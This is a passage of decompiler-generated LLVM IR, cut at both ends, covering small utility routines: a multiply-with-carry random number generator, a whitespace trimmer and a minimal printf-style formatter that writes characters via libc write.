  %v1_8048201 = xor i32 %v2_80481ff, %v2_80481fa
  store i32 %v1_8048201, i32* %eax.global-to-local, align 4
  %v2_8048206 = mul nuw nsw i32 %storemerge5, 4
  %v3_8048206 = add i32 %v2_8048206, ptrtoint (i32* @global_var_8071b60.16 to i32)
  %v4_8048206 = inttoptr i32 %v3_8048206 to i32*
  store i32 %v1_8048201, i32* %v4_8048206, align 4
  %v4_804820d = add nuw nsw i32 %storemerge5, 1
  %exitcond = icmp eq i32 %v4_804820d, 4096
  br i1 %exitcond, label %dec_label_pc_804821a, label %dec_label_pc_80481dd

dec_label_pc_804821a:                             ; preds = %dec_label_pc_80481dd
  %v0_804821b = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_804821b

; uselistorder directives
  uselistorder i32 %storemerge5, { 2, 3, 4, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80481dd, { 1, 0 }
}

define i32 @rand_cmwc(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8048238 = load i32, i32* @global_var_80718f8.19, align 8
  %v1_804823d = add i32 %v0_8048238, 1
  %v1_8048240 = urem i32 %v1_804823d, 4096
  store i32 %v1_8048240, i32* @global_var_80718f8.19, align 8
  %v1_804824f = mul nuw nsw i32 %v1_8048240, 4
  %v2_804824f = add i32 %v1_804824f, ptrtoint (i32* @global_var_8071b60.16 to i32)
  %v3_804824f = inttoptr i32 %v2_804824f to i32*
  %v4_804824f = load i32, i32* %v3_804824f, align 4
  %v11_8048269 = udiv i32 %v4_804824f, 228675
  store i32 %v11_8048269, i32* @global_var_80718f4.20, align 4
  br i1 true, label %dec_label_pc_80482bd, label %dec_label_pc_80482ac

dec_label_pc_80482ac:                             ; preds = %entry
  br label %dec_label_pc_80482bd

dec_label_pc_80482bd:                             ; preds = %entry, %dec_label_pc_80482ac
  store i32 %v1_8048240, i32* @ecx, align 4
  %v1_80482d2 = mul nuw nsw i32 %v1_8048240, 4
  %v2_80482d2 = add i32 %v1_80482d2, ptrtoint (i32* @global_var_8071b60.16 to i32)
  %v3_80482d2 = inttoptr i32 %v2_80482d2 to i32*
  %v4_80482d2 = load i32, i32* %v3_80482d2, align 4
  ret i32 %v4_80482d2

; uselistorder directives
  uselistorder i32 %v1_8048240, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_80482bd, { 1, 0 }
}

define i32 @trim(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_80482df = load i32, i32* @ebp, align 4
  store i32 %v0_80482df, i32* %stack_var_-4, align 4
  %v4_80482ec = ptrtoint i8* %arg1 to i32
  %v3_80482f2 = call i32 @strlen(i8* %arg1)
  %v1_80482f7 = add i32 %v3_80482f2, -1
  br label %dec_label_pc_8048303

dec_label_pc_80482ff:                             ; preds = %dec_label_pc_8048303
  %v4_80482ff = add i32 %stack_var_-12.0, 1
  br label %dec_label_pc_8048303

dec_label_pc_8048303:                             ; preds = %entry, %dec_label_pc_80482ff
  %stack_var_-12.0 = phi i32 [ 0, %entry ], [ %v4_80482ff, %dec_label_pc_80482ff ]
  %v6_8048306 = add i32 %stack_var_-12.0, %v4_80482ec
  %v1_8048309 = inttoptr i32 %v6_8048306 to i8*
  %v2_8048309 = load i8, i8* %v1_8048309, align 1
  %v2_804830c = sext i8 %v2_8048309 to i32
  %v2_8048312 = call i32 @isspace(i32 %v2_804830c)
  %v1_8048317 = icmp eq i32 %v2_8048312, 0
  %v1_8048319 = icmp eq i1 %v1_8048317, false
  br i1 %v1_8048319, label %dec_label_pc_80482ff, label %dec_label_pc_8048321.preheader

dec_label_pc_8048321.preheader:                   ; preds = %dec_label_pc_8048303
  %v5_804832719 = icmp slt i32 %v1_80482f7, %stack_var_-12.0
  br i1 %v5_804832719, label %dec_label_pc_8048341, label %dec_label_pc_8048329

dec_label_pc_804831d:                             ; preds = %dec_label_pc_8048329
  %v4_804831d = add i32 %stack_var_-8.020, -1
  %v5_8048327 = icmp slt i32 %v4_804831d, %stack_var_-12.0
  br i1 %v5_8048327, label %dec_label_pc_8048341, label %dec_label_pc_8048329

dec_label_pc_8048329:                             ; preds = %dec_label_pc_8048321.preheader, %dec_label_pc_804831d
  %stack_var_-8.020 = phi i32 [ %v4_804831d, %dec_label_pc_804831d ], [ %v1_80482f7, %dec_label_pc_8048321.preheader ]
  %v6_804832c = add i32 %stack_var_-8.020, %v4_80482ec
  %v1_804832f = inttoptr i32 %v6_804832c to i8*
  %v2_804832f = load i8, i8* %v1_804832f, align 1
  %v2_8048332 = sext i8 %v2_804832f to i32
  %v2_8048338 = call i32 @isspace(i32 %v2_8048332)
  %v1_804833d = icmp eq i32 %v2_8048338, 0
  %v1_804833f = icmp eq i1 %v1_804833d, false
  br i1 %v1_804833f, label %dec_label_pc_804831d, label %dec_label_pc_8048341

dec_label_pc_8048341:                             ; preds = %dec_label_pc_804831d, %dec_label_pc_8048329, %dec_label_pc_8048321.preheader
  %stack_var_-8.0.lcssa = phi i32 [ %v1_80482f7, %dec_label_pc_8048321.preheader ], [ %stack_var_-8.020, %dec_label_pc_8048329 ], [ %v4_804831d, %dec_label_pc_804831d ]
  %v7_804836b8 = icmp sgt i32 %stack_var_-12.0, %stack_var_-8.0.lcssa
  br i1 %v7_804836b8, label %dec_label_pc_804836d, label %dec_label_pc_8048349

dec_label_pc_8048349:                             ; preds = %dec_label_pc_8048341, %dec_label_pc_8048349
  %v6_804837510 = phi i32 [ %v6_8048375, %dec_label_pc_8048349 ], [ %v4_80482ec, %dec_label_pc_8048341 ]
  %storemerge9 = phi i32 [ %v4_8048361, %dec_label_pc_8048349 ], [ %stack_var_-12.0, %dec_label_pc_8048341 ]
  %v6_8048359 = add i32 %storemerge9, %v4_80482ec
  %v1_804835c = inttoptr i32 %v6_8048359 to i8*
  %v2_804835c = load i8, i8* %v1_804835c, align 1
  %v3_804835f = inttoptr i32 %v6_804837510 to i8*
  store i8 %v2_804835c, i8* %v3_804835f, align 1
  %v4_8048361 = add i32 %storemerge9, 1
  %v7_804836b = icmp sgt i32 %v4_8048361, %stack_var_-8.0.lcssa
  %v2_8048373 = sub i32 %v4_8048361, %stack_var_-12.0
  %v6_8048375 = add i32 %v2_8048373, %v4_80482ec
  br i1 %v7_804836b, label %dec_label_pc_804836d, label %dec_label_pc_8048349

dec_label_pc_804836d:                             ; preds = %dec_label_pc_8048349, %dec_label_pc_8048341
  %v6_8048375.lcssa = phi i32 [ %v4_80482ec, %dec_label_pc_8048341 ], [ %v6_8048375, %dec_label_pc_8048349 ]
  %v22_8048375 = inttoptr i32 %v6_8048375.lcssa to i8*
  store i8 0, i8* %v22_8048375, align 1
  %v2_804837b = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804837b, i32* @ebp, align 4
  ret i32 %v6_8048375.lcssa

; uselistorder directives
  uselistorder i32 %v6_8048375.lcssa, { 1, 0 }
  uselistorder i32 %v4_8048361, { 2, 1, 0 }
  uselistorder i32 %stack_var_-8.0.lcssa, { 1, 0 }
  uselistorder i32 %stack_var_-8.020, { 0, 2, 1 }
  uselistorder i32 %stack_var_-12.0, { 1, 0, 3, 2, 4, 5, 6 }
  uselistorder i32 %v4_80482ec, { 0, 2, 3, 1, 4, 5 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048349, { 1, 0 }
  uselistorder label %dec_label_pc_8048341, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048329, { 1, 0 }
  uselistorder label %dec_label_pc_8048303, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i8, align 1
  %tmp8 = trunc i32 %arg2 to i8
  store i8 %tmp8, i8* %stack_var_8, align 1
  %v4_8048383 = icmp eq i32* %arg1, null
  br i1 %v4_8048383, label %dec_label_pc_80483a2, label %dec_label_pc_8048389

dec_label_pc_8048389:                             ; preds = %entry
  %tmp5 = ptrtoint i32* %arg1 to i32
  %v2_804838c = load i32, i32* %arg1, align 4
  %v3_8048391 = inttoptr i32 %v2_804838c to i8*
  store i8 %tmp8, i8* %v3_8048391, align 1
  %v2_8048396 = load i32, i32* %arg1, align 4
  %v1_8048398 = add i32 %v2_8048396, 1
  store i32 %v1_8048398, i32* @edx, align 4
  store i32 %v1_8048398, i32* %arg1, align 4
  br label %dec_label_pc_80483bd

dec_label_pc_80483a2:                             ; preds = %entry
  %v2_80483aa = ptrtoint i8* %stack_var_8 to i32
  store i32 %v2_80483aa, i32* @eax, align 4
  %v3_80483b8 = call i32 @__GI___libc_write(i32 1, i32 %v2_80483aa, i32 1)
  br label %dec_label_pc_80483bd

dec_label_pc_80483bd:                             ; preds = %dec_label_pc_8048389, %dec_label_pc_80483a2
  %v0_80483be = phi i32 [ %tmp5, %dec_label_pc_8048389 ], [ %v3_80483b8, %dec_label_pc_80483a2 ]
  ret i32 %v0_80483be

; uselistorder directives
  uselistorder i32* %arg1, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_80483bd, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp14 = icmp slt i32 %arg3, 1
  br i1 %tmp14, label %dec_label_pc_8048422, label %dec_label_pc_80483d9

dec_label_pc_80483d9:                             ; preds = %entry
  %v4_80483e0 = ptrtoint i8* %arg2 to i32
  store i32 %v4_80483e0, i32* @edx, align 4
  %v2_80483f346 = load i8, i8* %arg2, align 1
  %v4_80483f648 = icmp eq i8 %v2_80483f346, 0
  %v1_80483f850 = icmp eq i1 %v4_80483f648, false
  br i1 %v1_80483f850, label %dec_label_pc_80483e8, label %dec_label_pc_80483fa

dec_label_pc_80483e8:                             ; preds = %dec_label_pc_80483d9, %dec_label_pc_80483e8
  %v4_80483f052 = phi i32 [ %v5_80483ec, %dec_label_pc_80483e8 ], [ %v4_80483e0, %dec_label_pc_80483d9 ]
  %stack_var_-12.051 = phi i32 [ %v4_80483e8, %dec_label_pc_80483e8 ], [ 0, %dec_label_pc_80483d9 ]
  %v4_80483e8 = add i32 %stack_var_-12.051, 1
  %v5_80483ec = add i32 %v4_80483f052, 1
  %v23_80483ec = inttoptr i32 %v5_80483ec to i8*
  store i32 %v5_80483ec, i32* @edx, align 4
  %v2_80483f3 = load i8, i8* %v23_80483ec, align 1
  %v4_80483f6 = icmp eq i8 %v2_80483f3, 0
  %v1_80483f8 = icmp eq i1 %v4_80483f6, false
  br i1 %v1_80483f8, label %dec_label_pc_80483e8, label %dec_label_pc_80483fa

dec_label_pc_80483fa:                             ; preds = %dec_label_pc_80483e8, %dec_label_pc_80483d9
  %stack_var_-12.0.lcssa = phi i32 [ 0, %dec_label_pc_80483d9 ], [ %v4_80483e8, %dec_label_pc_80483e8 ]
  %v5_8048400 = icmp slt i32 %stack_var_-12.0.lcssa, %arg3
  br i1 %v5_8048400, label %dec_label_pc_804840b, label %dec_label_pc_8048411

dec_label_pc_804840b:                             ; preds = %dec_label_pc_80483fa
  store i32 %stack_var_-12.0.lcssa, i32* @edx, align 4
  %v5_804840e = sub i32 %arg3, %stack_var_-12.0.lcssa
  br label %dec_label_pc_8048411

dec_label_pc_8048411:                             ; preds = %dec_label_pc_80483fa, %dec_label_pc_804840b
  %storemerge = phi i32 [ %v5_804840e, %dec_label_pc_804840b ], [ 0, %dec_label_pc_80483fa ]
  %v1_8048414 = and i32 %arg4, 2
  %tmp15 = mul nuw nsw i32 %v1_8048414, 8
  %tmp16 = or i32 %tmp15, 32
  br label %dec_label_pc_8048422

dec_label_pc_8048422:                             ; preds = %dec_label_pc_8048411, %entry
  %stack_var_12.0 = phi i32 [ %arg3, %entry ], [ %storemerge, %dec_label_pc_8048411 ]
  %stack_var_-16.0 = phi i32 [ 32, %entry ], [ %tmp16, %dec_label_pc_8048411 ]
  %v1_8048425 = urem i32 %arg4, 2
  %v2_8048425 = icmp eq i32 %v1_8048425, 0
  %v1_804842a = icmp eq i1 %v2_8048425, false
  %.pre = inttoptr i32 %arg1 to i32*
  br i1 %v1_804842a, label %dec_label_pc_8048470.preheader, label %dec_label_pc_8048448.preheader

dec_label_pc_8048448.preheader:                   ; preds = %dec_label_pc_8048422
  %tmp1739 = icmp slt i32 %stack_var_12.0, 1
  %tmp1840 = icmp eq i1 %tmp1739, false
  br i1 %tmp1840, label %dec_label_pc_804842e, label %dec_label_pc_8048470.preheader

dec_label_pc_804842e:                             ; preds = %dec_label_pc_8048448.preheader, %dec_label_pc_804842e
  %stack_var_-20.042 = phi i32 [ %v4_8048440, %dec_label_pc_804842e ], [ 0, %dec_label_pc_8048448.preheader ]
  %stack_var_12.141 = phi i32 [ %v4_8048444, %dec_label_pc_804842e ], [ %stack_var_12.0, %dec_label_pc_8048448.preheader ]
  %v3_804843b = call i32 @printchar(i32* %.pre, i32 %stack_var_-16.0)
  %v4_8048440 = add i32 %stack_var_-20.042, 1
  %v4_8048444 = add i32 %stack_var_12.141, -1
  %tmp17 = icmp slt i32 %v4_8048444, 1
  %tmp18 = icmp eq i1 %tmp17, false
  br i1 %tmp18, label %dec_label_pc_804842e, label %dec_label_pc_8048470.preheader

dec_label_pc_8048470.preheader:                   ; preds = %dec_label_pc_8048448.preheader, %dec_label_pc_804842e, %dec_label_pc_8048422
  %stack_var_12.2.ph = phi i32 [ %stack_var_12.0, %dec_label_pc_8048422 ], [ %stack_var_12.0, %dec_label_pc_8048448.preheader ], [ %v4_8048444, %dec_label_pc_804842e ]
  %stack_var_-20.1.ph = phi i32 [ 0, %dec_label_pc_8048422 ], [ 0, %dec_label_pc_8048448.preheader ], [ %v4_8048440, %dec_label_pc_804842e ]
  %v4_804847027 = ptrtoint i8* %arg2 to i32
  %v2_804847328 = load i8, i8* %arg2, align 1
  %v4_804847630 = icmp eq i8 %v2_804847328, 0
  %v1_804847832 = icmp eq i1 %v4_804847630, false
  br i1 %v1_804847832, label %dec_label_pc_8048450, label %dec_label_pc_8048496.preheader

dec_label_pc_8048450:                             ; preds = %dec_label_pc_8048470.preheader, %dec_label_pc_8048450
  %v4_804847035 = phi i32 [ %v5_804846c, %dec_label_pc_8048450 ], [ %v4_804847027, %dec_label_pc_8048470.preheader ]
  %stack_var_-20.134 = phi i32 [ %v4_8048468, %dec_label_pc_8048450 ], [ %stack_var_-20.1.ph, %dec_label_pc_8048470.preheader ]
  %stack_var_8.033 = phi i8* [ %v23_804846c, %dec_label_pc_8048450 ], [ %arg2, %dec_label_pc_8048470.preheader ]
  %v2_8048453 = load i8, i8* %stack_var_8.033, align 1
  %v3_8048453 = zext i8 %v2_8048453 to i32
  %v3_8048463 = call i32 @printchar(i32* %.pre, i32 %v3_8048453)
  %v4_8048468 = add i32 %stack_var_-20.134, 1
  %v5_804846c = add i32 %v4_804847035, 1
  %v23_804846c = inttoptr i32 %v5_804846c to i8*
  %v2_8048473 = load i8, i8* %v23_804846c, align 1
  %v4_8048476 = icmp eq i8 %v2_8048473, 0
  %v1_8048478 = icmp eq i1 %v4_8048476, false
  br i1 %v1_8048478, label %dec_label_pc_8048450, label %dec_label_pc_8048496.preheader

dec_label_pc_8048496.preheader:                   ; preds = %dec_label_pc_8048450, %dec_label_pc_8048470.preheader
  %stack_var_-20.1.lcssa = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_8048470.preheader ], [ %v4_8048468, %dec_label_pc_8048450 ]
  %tmp1923 = icmp slt i32 %stack_var_12.2.ph, 1
  %tmp2024 = icmp eq i1 %tmp1923, false
  br i1 %tmp2024, label %dec_label_pc_804847c, label %dec_label_pc_804849c

dec_label_pc_804847c:                             ; preds = %dec_label_pc_8048496.preheader, %dec_label_pc_804847c
  %stack_var_-20.226 = phi i32 [ %v4_804848e, %dec_label_pc_804847c ], [ %stack_var_-20.1.lcssa, %dec_label_pc_8048496.preheader ]
  %stack_var_12.325 = phi i32 [ %v4_8048492, %dec_label_pc_804847c ], [ %stack_var_12.2.ph, %dec_label_pc_8048496.preheader ]
  store i32 %stack_var_-16.0, i32* @edx, align 4
  %v3_8048489 = call i32 @printchar(i32* %.pre, i32 %stack_var_-16.0)
  %v4_804848e = add i32 %stack_var_-20.226, 1
  %v4_8048492 = add i32 %stack_var_12.325, -1
  %tmp19 = icmp slt i32 %v4_8048492, 1
  %tmp20 = icmp eq i1 %tmp19, false
  br i1 %tmp20, label %dec_label_pc_804847c, label %dec_label_pc_804849c

dec_label_pc_804849c:                             ; preds = %dec_label_pc_804847c, %dec_label_pc_8048496.preheader
  %stack_var_-20.2.lcssa = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_8048496.preheader ], [ %v4_804848e, %dec_label_pc_804847c ]
  ret i32 %stack_var_-20.2.lcssa

; uselistorder directives
  uselistorder i32 %v4_8048492, { 1, 0 }
  uselistorder i8* %v23_804846c, { 1, 0 }
  uselistorder i32 %v5_804846c, { 1, 0 }
  uselistorder i32 %v4_8048444, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 2, 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa, { 1, 2, 0 }
  uselistorder i32 %v5_80483ec, { 1, 2, 0 }
  uselistorder i32 %arg3, { 3, 1, 2, 0 }
  uselistorder i8* %arg2, { 0, 2, 3, 1, 4 }
  uselistorder label %dec_label_pc_804847c, { 1, 0 }
  uselistorder label %dec_label_pc_8048450, { 1, 0 }
  uselistorder label %dec_label_pc_8048470.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804842e, { 1, 0 }
  uselistorder label %dec_label_pc_8048411, { 1, 0 }
  uselistorder label %dec_label_pc_80483e8, { 1, 0 }
}

define i32 @printi(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v4_80484b5 = trunc i64 %arg2 to i32
  %v5_80484bb = icmp eq i32 %v4_80484b5, 0
  %v6_80484bb = icmp slt i32 %v4_80484b5, 0
  %v1_80484bf = icmp eq i1 %v5_80484bb, false
  br i1 %v1_80484bf, label %dec_label_pc_80484f1, label %dec_label_pc_80484c1

dec_label_pc_80484c1:                             ; preds = %entry
  store i32 48, i32* %stack_var_-16, align 4
  %tmp43 = bitcast i32* %stack_var_-16 to i8*
  %v6_80484e4 = call i32 @prints(i32 %arg1, i8* %tmp43, i32 %arg5, i32 %arg6)
  br label %dec_label_pc_80485dd

dec_label_pc_80484f1:                             ; preds = %entry
  %v4_80484f1 = icmp eq i32 %arg4, 0
  br i1 %v4_80484f1, label %dec_label_pc_8048512, label %dec_label_pc_80484f7

dec_label_pc_80484f7:                             ; preds = %dec_label_pc_80484f1
  %v13_80484f7 = icmp eq i32 %arg3, 10
  %v1_80484fb = icmp eq i1 %v13_80484f7, false
  br i1 %v1_80484fb, label %dec_label_pc_8048512, label %dec_label_pc_80484fd

dec_label_pc_80484fd:                             ; preds = %dec_label_pc_80484f7
  %v1_8048501 = icmp eq i1 %v6_80484bb, false
  br i1 %v1_8048501, label %dec_label_pc_8048512, label %dec_label_pc_8048503

dec_label_pc_8048503:                             ; preds = %dec_label_pc_80484fd
  %v1_804850d = sub i32 0, %v4_80484b5
  %v5_804850f = sext i32 %v1_804850d to i64
  br label %dec_label_pc_8048512

dec_label_pc_8048512:                             ; preds = %dec_label_pc_80484fd, %dec_label_pc_80484f7, %dec_label_pc_80484f1, %dec_label_pc_8048503
  %stack_var_-24.0 = phi i64 [ %arg2, %dec_label_pc_80484f1 ], [ %arg2, %dec_label_pc_80484f7 ], [ %arg2, %dec_label_pc_80484fd ], [ %v5_804850f, %dec_label_pc_8048503 ]
  %stack_var_-32.0 = phi i32 [ 0, %dec_label_pc_80484f1 ], [ 0, %dec_label_pc_80484f7 ], [ 0, %dec_label_pc_80484fd ], [ 1, %dec_label_pc_8048503 ]
  %tmp44 = bitcast i32* %stack_var_-5 to i8*
  store i8 0, i8* %tmp44, align 4
  %v4_80485728 = trunc i64 %stack_var_-24.0 to i32
  %v5_80485729 = icmp eq i32 %v4_80485728, 0
  %v1_804857616 = icmp eq i1 %v5_80485729, false
  br i1 %v1_804857616, label %dec_label_pc_8048523.lr.ph, label %dec_label_pc_8048578

dec_label_pc_8048523.lr.ph:                       ; preds = %dec_label_pc_8048512
  %v5_8048526 = sext i32 %arg3 to i64
  %v1_8048542 = add i32 %arg7, 198
  br label %dec_label_pc_8048523

dec_label_pc_8048523:                             ; preds = %dec_label_pc_8048523.lr.ph, %dec_label_pc_8048548
  %stack_var_-24.118 = phi i64 [ %stack_var_-24.0, %dec_label_pc_8048523.lr.ph ], [ %v5_804856f, %dec_label_pc_8048548 ]
  %stack_var_-40.017 = phi i8* [ %tmp44, %dec_label_pc_8048523.lr.ph ], [ %v23_8048548, %dec_label_pc_8048548 ]
  %v6_8048531 = and i64 %stack_var_-24.118, 4294967295
  %v12_8048531 = udiv i64 %v6_8048531, %v5_8048526
  %v13_8048531 = trunc i64 %v12_8048531 to i32
  %v14_8048531 = urem i64 %v6_8048531, %v5_8048526
  %v5_8048536 = trunc i64 %v14_8048531 to i8
  %v7_804853d = icmp sgt i8 %v5_8048536, 9
  br i1 %v7_804853d, label %dec_label_pc_804853f, label %dec_label_pc_8048548

dec_label_pc_804853f:                             ; preds = %dec_label_pc_8048523
  %tmp = trunc i64 %v14_8048531 to i32
  %v6_8048545 = add i32 %tmp, %v1_8048542
  %v18_8048545 = trunc i32 %v6_8048545 to i8
  br label %dec_label_pc_8048548

dec_label_pc_8048548:                             ; preds = %dec_label_pc_8048523, %dec_label_pc_804853f
  %stack_var_-36.0 = phi i8 [ %v18_8048545, %dec_label_pc_804853f ], [ %v5_8048536, %dec_label_pc_8048523 ]
  %v4_8048548 = ptrtoint i8* %stack_var_-40.017 to i32
  %v5_8048548 = add i32 %v4_8048548, -1
  %v23_8048548 = inttoptr i32 %v5_8048548 to i8*
  %v1_8048550 = add i8 %stack_var_-36.0, 48
  store i8 %v1_8048550, i8* %v23_8048548, align 1
  %v5_804856f = sext i32 %v13_8048531 to i64
  %v5_8048572 = icmp eq i32 %v13_8048531, 0
  %v1_8048576 = icmp eq i1 %v5_8048572, false
  br i1 %v1_8048576, label %dec_label_pc_8048523, label %dec_label_pc_8048578

dec_label_pc_8048578:                             ; preds = %dec_label_pc_8048548, %dec_label_pc_8048512
  %stack_var_-40.0.lcssa = phi i8* [ %tmp44, %dec_label_pc_8048512 ], [ %v23_8048548, %dec_label_pc_8048548 ]
  %v4_8048578 = icmp eq i32 %stack_var_-32.0, 0
  br i1 %v4_8048578, label %dec_label_pc_80485b5, label %dec_label_pc_804857e

dec_label_pc_804857e:                             ; preds = %dec_label_pc_8048578
  %v4_804857e = icmp eq i32 %arg5, 0
  br i1 %v4_804857e, label %dec_label_pc_80485ab, label %dec_label_pc_8048584

dec_label_pc_8048584:                             ; preds = %dec_label_pc_804857e
  %v1_8048587 = and i32 %arg6, 2
  %v2_8048587 = icmp eq i32 %v1_8048587, 0
  br i1 %v2_8048587, label %dec_label_pc_80485ab, label %dec_label_pc_804858e

dec_label_pc_804858e:                             ; preds = %dec_label_pc_8048584
  %v3_804859c = inttoptr i32 %arg1 to i32*
  %v4_804859c = call i32 @printchar(i32* %v3_804859c, i32 45)
  %v4_80485a5 = add i32 %arg5, -1
  br label %dec_label_pc_80485b5

dec_label_pc_80485ab:                             ; preds = %dec_label_pc_8048584, %dec_label_pc_804857e
  %v4_80485ab = ptrtoint i8* %stack_var_-40.0.lcssa to i32
  %v5_80485ab = add i32 %v4_80485ab, -1
  %v23_80485ab = inttoptr i32 %v5_80485ab to i8*
  store i8 45, i8* %v23_80485ab, align 1
  br label %dec_label_pc_80485b5

dec_label_pc_80485b5:                             ; preds = %dec_label_pc_8048578, %dec_label_pc_804858e, %dec_label_pc_80485ab
  %stack_var_20.0 = phi i32 [ %arg5, %dec_label_pc_8048578 ], [ %arg5, %dec_label_pc_80485ab ], [ %v4_80485a5, %dec_label_pc_804858e ]
  %stack_var_-40.1 = phi i8* [ %stack_var_-40.0.lcssa, %dec_label_pc_8048578 ], [ %v23_80485ab, %dec_label_pc_80485ab ], [ %stack_var_-40.0.lcssa, %dec_label_pc_804858e ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_8048578 ], [ 0, %dec_label_pc_80485ab ], [ 1, %dec_label_pc_804858e ]
  %v6_80485d0 = call i32 @prints(i32 %arg1, i8* %stack_var_-40.1, i32 %stack_var_20.0, i32 %arg6)
  %v2_80485d8 = add i32 %v6_80485d0, %stack_var_-28.0
  store i32 %v2_80485d8, i32* @edx, align 4
  br label %dec_label_pc_80485dd

dec_label_pc_80485dd:                             ; preds = %dec_label_pc_80484c1, %dec_label_pc_80485b5
  %storemerge = phi i32 [ %v2_80485d8, %dec_label_pc_80485b5 ], [ %v6_80484e4, %dec_label_pc_80484c1 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %stack_var_-40.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v23_8048548, { 0, 2, 1 }
  uselistorder i8 %v5_8048536, { 1, 0 }
  uselistorder i64 %v6_8048531, { 1, 0 }
  uselistorder i32 %arg6, { 1, 2, 0 }
  uselistorder i32 %arg5, { 2, 4, 1, 3, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i64 %arg2, { 2, 1, 0, 3 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80485dd, { 1, 0 }
  uselistorder label %dec_label_pc_80485b5, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048548, { 1, 0 }
  uselistorder label %dec_label_pc_8048523, { 1, 0 }
  uselistorder label %dec_label_pc_8048512, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp6 = ptrtoint i32* %arg1 to i32
  %stack_var_-6 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80485e2 = load i32, i32* @ebp, align 4
  store i32 %v0_80485e2, i32* %stack_var_-4, align 4
  %tmp21 = bitcast i32* %stack_var_-6 to i8*
  %stack_var_8.454 = inttoptr i32 %arg2 to i8*
  %v2_804889955 = load i8, i8* %stack_var_8.454, align 1
  %v4_804889c57 = icmp eq i8 %v2_804889955, 0
  %v1_804889e59 = icmp eq i1 %v4_804889c57, false
  br i1 %v1_804889e59, label %dec_label_pc_80485f4, label %dec_label_pc_80488a4

dec_label_pc_80485f4:                             ; preds = %entry, %dec_label_pc_8048892
  %stack_var_8.463 = phi i8* [ %stack_var_8.4, %dec_label_pc_8048892 ], [ %stack_var_8.454, %entry ]
  %stack_var_-28.162 = phi i32 [ %stack_var_-28.0, %dec_label_pc_8048892 ], [ 0, %entry ]
  %stack_var_12.161 = phi i32 [ %stack_var_12.0, %dec_label_pc_8048892 ], [ %arg3, %entry ]
  %stack_var_8.4.in60 = phi i32 [ %v5_8048892, %dec_label_pc_8048892 ], [ %arg2, %entry ]
  %v2_80485f7 = load i8, i8* %stack_var_8.463, align 1
  %v10_80485fa = icmp eq i8 %v2_80485f7, 37
  %v1_80485fc = icmp eq i1 %v10_80485fa, false
  br i1 %v1_80485fc, label %dec_label_pc_8048876, label %dec_label_pc_8048602

dec_label_pc_8048602:                             ; preds = %dec_label_pc_80485f4
  %v5_8048602 = add i32 %stack_var_8.4.in60, 1
  %v23_8048602 = inttoptr i32 %v5_8048602 to i8*
  %v2_8048616 = load i8, i8* %v23_8048602, align 1
  %v4_8048619 = icmp eq i8 %v2_8048616, 0
  br i1 %v4_8048619, label %dec_label_pc_80488a4, label %dec_label_pc_8048621

dec_label_pc_8048621:                             ; preds = %dec_label_pc_8048602
  %v2_8048624 = load i8, i8* %v23_8048602, align 1
  %v10_8048627 = icmp eq i8 %v2_8048624, 37
  br i1 %v10_8048627, label %dec_label_pc_8048876, label %dec_label_pc_804862f

dec_label_pc_804862f:                             ; preds = %dec_label_pc_8048621
  %v2_8048632 = load i8, i8* %v23_8048602, align 1
  %v10_8048635 = icmp eq i8 %v2_8048632, 45
  %v1_8048637 = icmp eq i1 %v10_8048635, false
  br i1 %v1_8048637, label %dec_label_pc_804864e.preheader, label %dec_label_pc_8048639

dec_label_pc_8048639:                             ; preds = %dec_label_pc_804862f
  %v5_8048639 = add i32 %stack_var_8.4.in60, 2
  %v23_8048639 = inttoptr i32 %v5_8048639 to i8*
  br label %dec_label_pc_804864e.preheader

dec_label_pc_804864e.preheader:                   ; preds = %dec_label_pc_8048639, %dec_label_pc_804862f
  %stack_var_8.0.ph = phi i8* [ %v23_8048602, %dec_label_pc_804862f ], [ %v23_8048639, %dec_label_pc_8048639 ]
  %stack_var_-32.0.ph = phi i32 [ 0, %dec_label_pc_804862f ], [ 1, %dec_label_pc_8048639 ]
  %v4_804864e22 = ptrtoint i8* %stack_var_8.0.ph to i32
  %v2_804865123 = load i8, i8* %stack_var_8.0.ph, align 1
  %v7_804865429 = icmp eq i8 %v2_804865123, 48
  br i1 %v7_804865429, label %dec_label_pc_8048646, label %dec_label_pc_804867b.preheader

dec_label_pc_8048646:                             ; preds = %dec_label_pc_804864e.preheader, %dec_label_pc_8048646
  %v4_804864e32 = phi i32 [ %v5_8048646, %dec_label_pc_8048646 ], [ %v4_804864e22, %dec_label_pc_804864e.preheader ]
  %stack_var_-32.031 = phi i32 [ %v4_804864a, %dec_label_pc_8048646 ], [ %stack_var_-32.0.ph, %dec_label_pc_804864e.preheader ]
  %v5_8048646 = add i32 %v4_804864e32, 1
  %v23_8048646 = inttoptr i32 %v5_8048646 to i8*
  %v4_804864a = or i32 %stack_var_-32.031, 2
